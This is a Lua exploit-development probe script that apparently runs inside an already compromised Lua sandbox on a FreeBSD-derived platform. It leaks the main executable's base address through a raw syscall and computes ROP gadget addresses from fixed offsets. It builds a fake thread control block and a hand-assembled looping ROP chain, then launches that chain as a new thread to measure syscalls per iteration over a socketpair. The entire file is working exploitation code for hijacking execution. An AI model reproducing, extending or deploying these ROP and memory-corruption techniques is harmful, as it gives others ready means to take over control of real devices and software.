-- CRASH_CLASS: MODERATE
-- PROBE 395b: child thread infinite loop with syscall per iteration
--
-- Extends 395a: child loops doing getpid(20) + writes result to shared mem.
-- Also creates a socketpair and child does write(wr_fd, &byte, 1) per iter.
-- Main thread counts bytes received = iteration count.
-- This measures child loop rate and validates syscalls work inside the loop.

print("=== PROBE 395b: loop syscall ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off
    local hi = eb_hi
    if lo >= 0x100000000 then
        hi = hi + math.floor(lo / 0x100000000)
        lo = lo % 0x100000000
    end
    return lo, hi
end

-- Gadgets
local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)
local pop_rsp_ret = g(0x9A2)

-- SIGSYS ignore
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Create socketpair(AF_UNIX=1, SOCK_DGRAM=2, 0, sv)
local sv = memory.alloc(16)
wd(N(sv), 0); wd(N(sv) + 4, 0); wd(N(sv) + 8, 0); wd(N(sv) + 12, 0)
local ok_sp, rv_sp = pcall(function()
    return mk(135)(uint64(1), uint64(2), uint64(0), sv)
end)
local sp_ret = ok_sp and N(rv_sp) or -999
local rd_fd = rd(N(sv))
local wr_fd = rd(N(sv) + 4)
print(string.format("socketpair=%d rd=%d wr=%d", sp_ret, rd_fd or -1, wr_fd or -1))
if sp_ret ~= 0 then print("socketpair FAIL"); return end

-- Set write-end non-blocking: ioctl(wr_fd, FIONBIO, &one)
local one_buf = memory.alloc(8)
wd(N(one_buf), 1)
pcall(function()
    mk(54)(uint64(wr_fd), uint64(0x8004667E), one_buf)
end)

-- Shared memory
local shared = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(shared) + i, 0) end
local marker_a = N(shared)
local wbyte_a = N(shared) + 0x10  -- one byte for write()
wd(wbyte_a, 0x41)  -- 'A'

-- Fake TCB — large buffer, %fs points to the MIDDLE
-- Negative TLS offsets (errno, pthread struct) land in the lower half
-- instead of corrupting adjacent Lua VM heap
local tcb_buf = memory.alloc(0x4000)  -- 16KB total
for i = 0, 0x3FFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x2000  -- point %fs here (8KB below, 8KB above)
wq(tcb_mid, uint64(tcb_mid))         -- self-pointer at +0
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

-- Stack buffer
local BUF_SIZE = 0x10000
local stk = memory.alloc(BUF_SIZE)
for i = 0, BUF_SIZE - 4, 4 do wd(N(stk) + i, 0) end
local stk_base = N(stk)
local NOMINAL_SIZE = 0x100
local rsp = ((stk_base + NOMINAL_SIZE) - ((stk_base + NOMINAL_SIZE) % 16)) - 8

-- Build chain
local sp = rsp
local function push(val)
    wq(sp, val); sp = sp + 8
end

-- Preamble: sysarch(SET_FSBASE=129, &tcb_ptr) — runs once
push(uint64(165))     -- RAX = sysarch num (read by start_func pop_rax;ret)
push(pop_rdi_ret)
push(uint64(129))
push(pop_rsi_ret)
push(uint64(N(tcb_ptr)))
push(pop_rdx_ret)
push(uint64(0))
push(pop_rcx_ret)
push(uint64(0))
push(stub)

-- Loop start
local loop_addr = sp

-- 1) write(wr_fd, &wbyte, 1) — one byte per iteration through socketpair
push(pop_rax_ret)
push(uint64(4))       -- write syscall
push(pop_rdi_ret)
push(uint64(wr_fd))
push(pop_rsi_ret)
push(uint64(wbyte_a))
push(pop_rdx_ret)
push(uint64(1))
push(pop_rcx_ret)
push(uint64(0))
push(stub)

-- 2) write marker to shared mem
push(pop_rdi_ret)
push(uint64(marker_a))
push(pop_rax_ret)
push(uint64(0xCAFE))
push(mov_rdi_rax)

-- Loop back
push(pop_rsp_ret)
push(uint64(loop_addr))

local chain_bytes = sp - rsp
print(string.format("rsp=%X loop=%X chain=%d bytes", rsp, loop_addr, chain_bytes))

-- thr_param
local pa = memory.alloc(0x38)
for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
local sf_lo, sf_hi = g_lohi(0x992)
w64(N(pa), sf_lo, sf_hi)
w64(N(pa) + 8, 0, 0)
w64(N(pa) + 0x10, stk_base % 0x100000000, math.floor(stk_base / 0x100000000))
w64(N(pa) + 0x18, NOMINAL_SIZE, 0)
local ctid = memory.alloc(8)
w64(N(ctid), 0, 0)
w64(N(pa) + 0x30, N(ctid) % 0x100000000, math.floor(N(ctid) / 0x100000000))

-- Launch child
print("launch")
local ok_t, rv_t = pcall(function()
    return mk(455)(uint64(N(pa)), uint64(0x38))
end)
local tret = ok_t and N(rv_t) or -999
print(string.format("thr=%d", tret))
if tret ~= 0 then print("FAIL"); return end
if not alive() then print("DEAD"); return end

-- Drain any initial bytes from socketpair
local drain = memory.alloc(0x2000)
pcall(function()
    mk(3)(uint64(rd_fd), drain, uint64(0x2000))
end)

-- Wait a bit (busy loop, ~10ms of wall time)
local dummy = 0
for i = 1, 200000 do dummy = dummy + 1 end

-- Read bytes from socketpair = iteration count
local rbuf = memory.alloc(0x4000)
for i = 0, 0x3FFC, 4 do wd(N(rbuf) + i, 0) end
local ok_r, rv_r = pcall(function()
    return mk(3)(uint64(rd_fd), rbuf, uint64(0x4000))
end)
local bytes_read = ok_r and N(rv_r) or -1
print(string.format("bytes=%d (iterations)", bytes_read))

-- Check marker
local m = rd(marker_a)
print(string.format("marker=%04X", m or 0))

-- Check child alive
local tid_lo = rd(N(ctid))
if tid_lo and tid_lo > 0 then
    local ok_k, rv_k = pcall(function()
        return mk(433)(uint64(tid_lo), uint64(0))
    end)
    print(string.format("thr_kill=%d", ok_k and N(rv_k) or -999))
end

print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 395b COMPLETE ===")
